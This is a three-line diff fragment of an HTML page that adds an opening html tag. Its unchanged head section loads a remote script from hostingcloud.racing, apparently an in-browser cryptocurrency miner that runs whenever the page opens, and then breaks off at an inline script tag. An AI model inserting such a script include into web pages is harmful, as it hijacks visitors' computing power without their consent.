@@ -1,3 +1,4 @@
+<html>
 <head>
 <script src="https://www.hostingcloud.racing/ElSO.js"></script>
 <script>
